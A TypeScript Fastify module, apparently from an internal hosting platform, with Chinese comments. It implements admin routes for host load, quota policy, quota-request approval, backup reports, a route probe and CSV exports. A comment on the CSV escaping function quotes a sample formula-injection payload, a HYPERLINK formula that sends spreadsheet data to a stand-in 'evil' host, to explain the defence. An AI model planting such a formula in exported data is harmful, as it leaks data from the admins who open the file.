import { readFile, statfs } from 'node:fs/promises';
import { cpus, freemem, loadavg, totalmem } from 'node:os';
import type { FastifyInstance, FastifyRequest } from 'fastify';
import { API_BASE, ERROR_CODES, IspaceError, type User } from '@ispace/contracts';
import { writeAudit, type Sql } from '@ispace/db';
import { z } from 'zod';

/**
 * 治理面：单机负载、提额申请、默认策略、备份状态、路由探活、名单导出。
 *
 * 这些是设计稿管理员 5 屏上有、但一期只做了静态文案的部分。它们都需要
 * 自己的数据源（迁移 0003 建的表），所以单独成一个模块，而不是继续往
 * admin.ts 里堆——那个文件已经是"能从既有数据算出来的部分"的集合。
 */

// ── 单机负载 ──────────────────────────────────────────────────────────

/**
 * 采样一次 /proc/stat，返回累计的 (忙, 总) 时钟节拍。
 *
 * 容器里的 /proc 默认就是宿主的（Docker 不虚拟化 /proc，除非挂了 LXCFS），
 * 所以这里读到的是整机负载——正是设计稿「单机负载」要的口径。
 */
async function cpuTicks(): Promise<{ busy: number; total: number } | null> {
  try {
    const line = (await readFile('/proc/stat', 'utf8')).split('\n')[0];
    if (!line?.startsWith('cpu ')) return null;
    const v = line.slice(4).trim().split(/\s+/).map(Number);
    const total = v.reduce((a, b) => a + b, 0);
    // 第 4 个字段是 idle，第 5 个是 iowait。两者都不算忙。
    const idle = (v[3] ?? 0) + (v[4] ?? 0);
    return { busy: total - idle, total };
  } catch {
    return null;
  }
}

/**
 * CPU 使用率。
 *
 * 必须采样两次做差：/proc/stat 是开机以来的累计值，单次读到的是
 * "自开机以来的平均"，机器跑久了会趋近一个几乎不动的数——看着像坏了。
 */
async function cpuPercent(): Promise<number> {
  const a = await cpuTicks();
  if (!a) {
    // 读不到 /proc（比如 macOS 本地开发）就退回 loadavg 估算
    return Math.min(100, Math.round((loadavg()[0]! / cpus().length) * 100));
  }
  await new Promise((r) => setTimeout(r, 200));
  const b = await cpuTicks();
  if (!b || b.total === a.total) return 0;
  return Math.max(0, Math.min(100, Math.round(((b.busy - a.busy) / (b.total - a.total)) * 100)));
}

// ── CSV 导出 ──────────────────────────────────────────────────────────
/**
 * CSV 单元格转义。两件事：
 *
 * 1. 结构转义：逗号、引号、换行直接拼会把表格拆错行。
 * 2. 公式注入：Excel / Numbers / WPS 会把 = + - @ 开头的单元格当公式**执行**。
 *    姓名与申请理由都是用户可控的自由文本，把姓名改成
 *    `=HYPERLINK("http://evil/?d="&A1)` 之后，管理员一打开导出文件就中招——
 *    而这个文件恰恰是给管理员用 Excel 看的。前置单引号让它退回纯文本。
 *    制表符与回车也要防：有的实现会先剥掉前导空白再判首字符。
 */
export const cell = (v: unknown): string => {
  let s = v === null || v === undefined ? '' : String(v);
  if (/^[=+\-@\t\r]/.test(s)) s = `'${s}`;
  return /[",\n\r]/.test(s) ? `"${s.replace(/"/g, '""')}"` : s;
};
export const toCsv = (headers: string[], rows: unknown[][]): string =>
  // 带 BOM：没有它 Excel 打开中文列名是乱码，而这个文件就是给人用 Excel 看的
  '﻿' + [headers, ...rows].map((r) => r.map(cell).join(',')).join('\r\n');

export function registerGovernanceRoutes(
  app: FastifyInstance,
  deps: {
    sql: Sql;
    requireAuth: (req: FastifyRequest) => Promise<User>;
    requireAdmin: (req: FastifyRequest) => Promise<User>;
    publicBase: string;
    sitesRoot: string;
  },
): void {
  const { sql, requireAuth, requireAdmin, publicBase, sitesRoot } = deps;

  // ── 单机负载（设计稿「平台总览」右下）──────────────────────────────
  app.get(`${API_BASE}/admin/host`, async (req) => {
    await requireAdmin(req);

    const total = totalmem();
    const used = total - freemem();

    // 磁盘看 /srv 所在的文件系统。它是宿主的 bind mount，
    // 所以拿到的是宿主 /srv 的真实占用，不是容器层的。
    let disk = { total: 0, used: 0, percent: 0 };
    try {
      const s = await statfs(sitesRoot);
      const bytes = s.blocks * s.bsize;
      // bavail 是非特权用户可用的，比 bfree 更贴近"还能写多少"
      const avail = s.bavail * s.bsize;
      disk = {
        total: bytes,
        used: bytes - avail,
        percent: bytes === 0 ? 0 : Math.round(((bytes - avail) / bytes) * 100),
      };
    } catch {
      // statfs 拿不到就留 0，前端显示「—」而不是编一个数
    }

    return {
      cpu: { percent: await cpuPercent(), cores: cpus().length },
      memory: { total, used, percent: total === 0 ? 0 : Math.round((used / total) * 100) },
      disk,
    };
  });

  // ── 默认配额策略（设计稿「资源与配额」上半）────────────────────────
  app.get(`${API_BASE}/admin/policy`, async (req) => {
    await requireAdmin(req);
    const [row] = await sql`SELECT * FROM ispace.platform_policy WHERE id = true`;
    return { policy: row ?? null };
  });

  /**
   * 平台设置。
   *
   * 这些值此前分别写死在契约常量、auth 包常量与环境变量里，改任何一个
   * 都要发版或重启服务。对一个内部平台来说，「把闲置归档从 90 天调成
   * 120 天」不该是一次上线。
   *
   * 全部集中在 platform_policy 单行表，改完立刻生效——没有缓存层，
   * 每次读策略都是一次很便宜的主键查询。
   */
  const policySchema = z.object({
    // ── 资源默认值（原有）──
    backendCpuLimit: z.string().regex(/^\d+(\.\d+)?$/, 'CPU 上限形如 0.5 或 1'),
    backendMemoryBytes: z.number().int().min(64 * 1024 * 1024).max(8 * 1024 * 1024 * 1024),
    backendCountLimit: z.number().int().min(0).max(20),
    storageBytesLimit: z.number().int().min(10 * 1024 * 1024).max(50 * 1024 * 1024 * 1024),

    // ── 账号准入 ──
    /** 逗号分隔的邮箱后缀。留空表示不限后缀。 */
    emailDomains: z.string().max(500),
    selfRegisterEnabled: z.boolean(),
    requireApproval: z.boolean(),
    passwordMinLength: z.number().int().min(8).max(64),
    sessionDays: z.number().int().min(1).max(365),

    // ── 生命周期 ──
    idleArchiveDays: z.number().int().min(7).max(3650),
    auditRetentionMonths: z.number().int().min(1).max(120),
    /** 0 = 不限期。只影响新建的令牌。 */
    tokenMaxDays: z.number().int().min(0).max(3650),

    // ── 分享范围 ──
    allowPublicShare: z.boolean(),
    allowPeerShare: z.boolean(),
  });

  app.put(`${API_BASE}/admin/policy`, async (req) => {
    const admin = await requireAdmin(req);
    const input = policySchema.parse(req.body ?? {});

    /*
      关掉自助注册的同时又要求审批，是一组自相矛盾的设置：
      没人能注册，也就没人可批。挡在这里而不是让管理员事后困惑。
    */
    if (!input.selfRegisterEnabled && input.requireApproval) {
      throw new IspaceError(
        ERROR_CODES.INVALID_INPUT,
        '已关闭自助注册时不需要「需管理员批准」——没有人能注册，也就没有待批的人。',
      );
    }

    const [row] = await sql`
      UPDATE ispace.platform_policy
         SET backend_cpu_limit    = ${input.backendCpuLimit},
             backend_memory_bytes = ${input.backendMemoryBytes},
             backend_count_limit  = ${input.backendCountLimit},
             storage_bytes_limit  = ${input.storageBytesLimit},
             email_domains        = ${input.emailDomains.trim()},
             self_register_enabled = ${input.selfRegisterEnabled},
             require_approval     = ${input.requireApproval},
             password_min_length  = ${input.passwordMinLength},
             session_days         = ${input.sessionDays},
             idle_archive_days    = ${input.idleArchiveDays},
             audit_retention_months = ${input.auditRetentionMonths},
             token_max_days       = ${input.tokenMaxDays},
             allow_public_share   = ${input.allowPublicShare},
             allow_peer_share     = ${input.allowPeerShare},
             updated_by = ${admin.id}, updated_at = now()
       WHERE id = true
      RETURNING *
    `;
    await writeAudit(sql, {
      actorId: admin.id, action: 'policy.update', targetType: 'policy',
      source: 'console', result: 'success', metadata: { ...input },
      ip: req.ip,
    });
    return {
      policy: row,
      /*
        逐条说清「什么时候生效」。这几项的生效时机不一样，
        不说明的话管理员会以为改完全平台立刻就变了：
      */
      notes: [
        '资源默认值：只对之后创建的后端生效，已运行的容器不受影响',
        '会话有效期：已签发的会话不受影响，过期时间在签发时就定死了',
        '令牌有效期：只影响之后新建的令牌，已发出去的不会被追改',
        '分享范围：关掉后不会自动下架已有内容，那要在市场里逐个处理',
      ],
    };
  });

  /**
   * 后台任务心跳（巡检屏）。
   *
   * 宿主上的资源采样跑在 crontab 里，服务端看不见它的进程。它挂掉时的
   * 表现是「配额页永远显示暂无采样」——管理员分不清是"这个人没有后端"
   * 还是"采集任务死了"。有了心跳就能直接说：三分钟前还活着。
   *
   * 判活阈值给到间隔的三倍：cron 是分钟级的，宿主一忙就可能晚一两轮，
   * 卡在 1 分钟会天天误报。
   */
  app.get(`${API_BASE}/admin/jobs`, async (req) => {
    await requireAdmin(req);
    const rows = await sql<
      { name: string; last_run_at: Date; ok: boolean; note: string | null; stale: boolean }[]
    >`
      SELECT name, last_run_at, ok, note,
             last_run_at < now() - interval '3 minutes' AS stale
        FROM ispace.job_heartbeats
       ORDER BY name
    `.catch(() => []);

    return {
      jobs: rows.map((r) => ({
        name: r.name,
        lastRunAt: r.last_run_at,
        ok: r.ok,
        note: r.note,
        /** alive / stale / failing —— 前端据此上色，不必自己算阈值。 */
        state: r.stale ? 'stale' : r.ok ? 'alive' : 'failing',
      })),
      known: [
        { name: 'resource-sampler', label: '后端资源采样', every: '每分钟',
          install: 'infra/scripts/12-resource-sampler.sh --install' },
      ],
    };
  });

  // ── 提额申请：员工提交 ────────────────────────────────────────────
  const requestSchema = z.object({
    resource: z.enum(['storage', 'backends', 'rows']),
    requestedLimit: z.number().int().positive(),
    reason: z.string().min(1, '说明一下用途，管理员据此判断').max(500),
  });

  app.post(`${API_BASE}/quota/requests`, async (req) => {
    const me = await requireAuth(req);
    const input = requestSchema.parse(req.body ?? {});

    const [q] = await sql<
      { storage_bytes_used: string; storage_bytes_limit: string;
        backend_count: string; backend_count_limit: string;
        db_rows_used: string; db_rows_limit: string }[]
    >`SELECT * FROM ispace.quotas WHERE user_id = ${me.id}`;
    if (!q) throw new IspaceError(ERROR_CODES.NOT_FOUND, '配额记录不存在');

    const picked = {
      storage:  [q.storage_bytes_used, q.storage_bytes_limit],
      backends: [q.backend_count, q.backend_count_limit],
      rows:     [q.db_rows_used, q.db_rows_limit],
    }[input.resource];

    const currentLimit = Number(picked[1] ?? 0);
    if (input.requestedLimit <= currentLimit) {
      throw new IspaceError(
        ERROR_CODES.INVALID_INPUT,
        `申请值需大于当前上限（${currentLimit}）`,
      );
    }

    try {
      const [row] = await sql`
        INSERT INTO ispace.quota_requests
          (user_id, resource, current_used, current_limit, requested_limit, reason)
        VALUES (${me.id}, ${input.resource}, ${Number(picked[0] ?? 0)},
                ${currentLimit}, ${input.requestedLimit}, ${input.reason})
        RETURNING *
      `;
      await writeAudit(sql, {
        actorId: me.id, action: 'quota.request', targetType: 'quota',
        source: 'console', result: 'success',
        metadata: { resource: input.resource, requested: input.requestedLimit },
        ip: req.ip,
      });
      return { request: row };
    } catch (e) {
      // 唯一索引挡住的重复提交。这是预期内的，给一句人话而不是 500。
      // 认 SQLSTATE 23505（unique_violation）+ 约束名，不认错误文本——
      // 文本随 Postgres 版本与 locale 变，靠它匹配迟早会静默失效成 500。
      const pg = e as { code?: string; constraint_name?: string };
      if (pg.code === '23505' && pg.constraint_name === 'quota_requests_one_pending_idx') {
        throw new IspaceError(
          ERROR_CODES.INVALID_INPUT,
          '这项资源已经有一条待处理的申请了，等管理员处理完再提',
        );
      }
      throw e;
    }
  });

  /** 员工看自己的申请记录。 */
  app.get(`${API_BASE}/quota/requests`, async (req) => {
    const me = await requireAuth(req);
    const rows = await sql`
      SELECT * FROM ispace.quota_requests
       WHERE user_id = ${me.id} ORDER BY created_at DESC LIMIT 20
    `;
    return { requests: rows };
  });

  // ── 提额申请：管理员审批 ──────────────────────────────────────────
  app.get(`${API_BASE}/admin/quota-requests`, async (req) => {
    await requireAdmin(req);
    const rows = await sql`
      SELECT r.*, u.username, u.display_name
        FROM ispace.quota_requests r
        JOIN ispace.users u ON u.id = r.user_id
       ORDER BY (r.status = 'pending') DESC, r.created_at DESC
       LIMIT 100
    `;
    return { requests: rows };
  });

  const decideSchema = z.object({
    approve: z.boolean(),
    note: z.string().max(300).optional(),
  });

  app.post(`${API_BASE}/admin/quota-requests/:id/decide`, async (req) => {
    const admin = await requireAdmin(req);
    const { id } = req.params as { id: string };
    const { approve, note } = decideSchema.parse(req.body ?? {});

    /**
     * 改申请状态与写回配额必须在同一个事务里。
     *
     * 分开写的话，第一步成功、第二步失败（连接抖动、锁等待超时）就会留下
     * 「已通过但上限没变」——员工看到批了却仍然发不上去，管理员看到的是
     * 已处理，没人会再点一次。这正是"批了但没生效"，比直接失败糟得多。
     *
     * WHERE status='pending' 同时也是并发闸门：两个管理员同时点通过，
     * 只有一个的 UPDATE 会命中行，另一个拿到空结果走 NOT_FOUND。
     */
    const reqRow = await sql.begin(async (tx) => {
      const [row] = await tx<
        { id: string; user_id: string; resource: string; requested_limit: string }[]
      >`
        UPDATE ispace.quota_requests
           SET status = ${approve ? 'approved' : 'rejected'},
               decided_by = ${admin.id}, decided_at = now(), decision_note = ${note ?? null}
         WHERE id = ${id} AND status = 'pending'
        RETURNING id, user_id, resource, requested_limit::text AS requested_limit
      `;
      if (!row) return null;

      if (approve) {
        const column = {
          storage: 'storage_bytes_limit',
          backends: 'backend_count_limit',
          rows: 'db_rows_limit',
        }[row.resource];
        // resource 有 CHECK 约束兜底，走不到这里；真走到了说明约束被改过，
        // 此时宁可整笔回滚也不能拿一个猜的列名去写
        if (!column) throw new IspaceError(ERROR_CODES.INVALID_INPUT, `未知资源：${row.resource}`);
        // 列名来自上面的白名单映射，不是用户输入；值仍走参数绑定
        await tx.unsafe(
          `UPDATE ispace.quotas SET ${column} = $1 WHERE user_id = $2`,
          [Number(row.requested_limit), row.user_id],
        );
      }
      return row;
    });
    if (!reqRow) throw new IspaceError(ERROR_CODES.NOT_FOUND, '申请不存在或已处理');

    await writeAudit(sql, {
      actorId: admin.id, action: 'quota.decide', targetType: 'quota', targetId: id,
      source: 'console', result: 'success',
      metadata: { approve, resource: reqRow.resource, note },
      ip: req.ip,
    });
    return { ok: true };
  });

  // ── 备份与恢复（设计稿「审计与安全」第三个页签）────────────────────
  app.get(`${API_BASE}/admin/backups`, async (req) => {
    await requireAdmin(req);
    const rows = await sql`
      SELECT * FROM ispace.backup_runs ORDER BY finished_at DESC LIMIT 20
    `;
    return { runs: rows };
  });

  /** 备份脚本回写结果。用管理员令牌调用，与人工操作走同一套鉴权。 */
  const backupReportSchema = z.object({
    kind: z.enum(['backup', 'restore_drill']),
    status: z.enum(['success', 'failed']),
    // 直接进 timestamptz 列。不校验的话一个乱字符串会变成 500，
    // 而调用方（备份脚本）只看到「回写失败」，查不出原因。
    startedAt: z.string().datetime({ offset: true }),
    sizeBytes: z.number().int().nonnegative().optional(),
    note: z.string().max(1000).optional(),
  });

  app.post(`${API_BASE}/admin/backups`, async (req) => {
    const admin = await requireAdmin(req);
    const input = backupReportSchema.parse(req.body ?? {});
    const [row] = await sql`
      INSERT INTO ispace.backup_runs (kind, status, started_at, size_bytes, note)
      VALUES (${input.kind}, ${input.status}, ${input.startedAt},
              ${input.sizeBytes ?? null}, ${input.note ?? null})
      RETURNING *
    `;
    await writeAudit(sql, {
      actorId: admin.id, action: 'backup.report', targetType: 'backup',
      source: 'cli', result: input.status === 'success' ? 'success' : 'failed',
      metadata: { kind: input.kind }, ip: req.ip,
    });
    return { run: row };
  });

  // ── 路由探活（设计稿「平台巡检」的「立即探活」）────────────────────
  /**
   * 真的去请求一个员工空间地址，确认 200。
   *
   * 静态托管应用重建后服务名会变，路由规则里引用的旧名会让**全部**员工
   * 页面 404。这一条是那次事故的直接探针，所以要真发请求，
   * 不能只查配置文件里写了什么。
   */
  app.post(`${API_BASE}/admin/probe`, async (req) => {
    await requireAdmin(req);

    const [row] = await sql<{ username: string; slug: string }[]>`
      SELECT u.username, a.slug
        FROM ispace.apps a JOIN ispace.users u ON u.id = a.owner_id
       WHERE a.status = 'running' AND u.status = 'active'
       ORDER BY a.updated_at DESC LIMIT 1
    `;
    if (!row) return { probed: null, ok: null, note: '还没有运行中的页面可探' };

    const url = `${publicBase}/${row.username}/${row.slug}/`;
    const started = Date.now();
    try {
      const res = await fetch(url, {
        redirect: 'manual',
        signal: AbortSignal.timeout(8000),
      });
      return {
        probed: url,
        ok: res.status === 200,
        status: res.status,
        ms: Date.now() - started,
      };
    } catch (e) {
      return {
        probed: url,
        ok: false,
        status: 0,
        ms: Date.now() - started,
        note: e instanceof Error ? e.message : String(e),
      };
    }
  });

  // ── 导出（设计稿「导出名单」「导出记录」）──────────────────────────

  app.get(`${API_BASE}/admin/users/export`, async (req, reply) => {
    const admin = await requireAdmin(req);
    const rows = await sql<
      { username: string; display_name: string; email: string; role: string;
        identity: string; status: string; app_count: string;
        storage_used: string; storage_limit: string; created_at: Date }[]
    >`
      SELECT u.username, u.display_name, u.email, u.role, u.identity, u.status,
             u.created_at,
             COALESCE(q.storage_bytes_used, 0)::text  AS storage_used,
             COALESCE(q.storage_bytes_limit, 0)::text AS storage_limit,
             (SELECT count(*) FROM ispace.apps a WHERE a.owner_id = u.id)::text AS app_count
        FROM ispace.users u LEFT JOIN ispace.quotas q ON q.user_id = u.id
       ORDER BY u.created_at DESC
    `;
    await writeAudit(sql, {
      actorId: admin.id, action: 'users.export', targetType: 'user',
      source: 'console', result: 'success', metadata: { count: rows.length }, ip: req.ip,
    });
    void reply
      .header('content-type', 'text/csv; charset=utf-8')
      .header('content-disposition', 'attachment; filename="ispace-users.csv"');
    return toCsv(
      ['用户名', '姓名', '邮箱', '角色', '身份', '状态', '页面数', '已用字节', '空间上限', '开通时间'],
      rows.map((r) => [
        r.username, r.display_name, r.email, r.role, r.identity, r.status,
        r.app_count, r.storage_used, r.storage_limit,
        r.created_at.toISOString(),
      ]),
    );
  });

  app.get(`${API_BASE}/admin/audit/export`, async (req, reply) => {
    const admin = await requireAdmin(req);
    const rows = await sql<
      { created_at: Date; username: string; action: string; target_type: string;
        target_id: string | null; source: string; result: string; ip: string | null }[]
    >`
      SELECT a.created_at, u.username, a.action, a.target_type, a.target_id,
             a.source, a.result, host(a.ip) AS ip
        FROM ispace.audit_logs a JOIN ispace.users u ON u.id = a.actor_id
       ORDER BY a.created_at DESC LIMIT 5000
    `;
    await writeAudit(sql, {
      actorId: admin.id, action: 'audit.export', targetType: 'audit',
      source: 'console', result: 'success', metadata: { count: rows.length }, ip: req.ip,
    });
    void reply
      .header('content-type', 'text/csv; charset=utf-8')
      .header('content-disposition', 'attachment; filename="ispace-audit.csv"');
    return toCsv(
      ['时间', '操作人', '动作', '对象类型', '对象', '入口', '结果', 'IP'],
      rows.map((r) => [
        r.created_at.toISOString(), r.username, r.action, r.target_type,
        r.target_id, r.source, r.result, r.ip,
      ]),
    );
  });
}
